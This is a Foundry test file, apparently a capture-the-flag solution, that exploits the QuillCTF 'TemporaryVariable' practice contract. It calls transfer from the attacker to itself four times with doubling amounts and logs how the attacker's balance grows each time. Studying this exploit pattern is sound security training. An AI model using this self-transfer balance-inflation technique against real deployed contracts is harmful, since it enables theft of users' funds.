// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import {factory} from "../../src/QuillCTF/TemporaryVariable.sol";

contract TemporaryVariableTest is Test {
    factory public __factory;

    address public deployer;
    address public attacker;

    function setUp() public {
        deployer = vm.addr(1); 
        attacker = vm.addr(2);

        vm.startPrank(deployer);
        __factory = new factory();
        vm.stopPrank();

        vm.deal(attacker, 10 ether);

        vm.prank(attacker);
        __factory.supply(attacker, 10 ether);
    }

    function testTemporaryVariableExploit() public {
        // Before Exploit
       uint256 prevBalance = __factory.checkbalance(attacker);
       console.log("Before exploit balance: ", prevBalance);

        // Exploit
        vm.startPrank(attacker);
        __factory.transfer(attacker, attacker, 10 ether);
        vm.stopPrank();

        // After Exploit
        uint256 balance = __factory.checkbalance(attacker);
        console.log("After exploit balance: ", balance);

        // Exploit 2
        vm.startPrank(attacker);
        __factory.transfer(attacker, attacker, 20 ether);
        vm.stopPrank();

        // After Exploit 2
        uint256 balance_ = __factory.checkbalance(attacker);
        console.log("After exploit 2 balance: ", balance_);

        // Exploit 3
        vm.startPrank(attacker);
        __factory.transfer(attacker, attacker, 40 ether);
        vm.stopPrank();

        // After Exploit 3
        uint256 balance__ = __factory.checkbalance(attacker);
        console.log("After exploit 3 balance: ", balance__);

        // Exploit 4
        vm.startPrank(attacker);
        __factory.transfer(attacker, attacker, 80 ether);
        vm.stopPrank();

        // After Exploit 4
        uint256 balance___ = __factory.checkbalance(attacker);
        console.log("After exploit 4 balance: ", balance___);
    }
}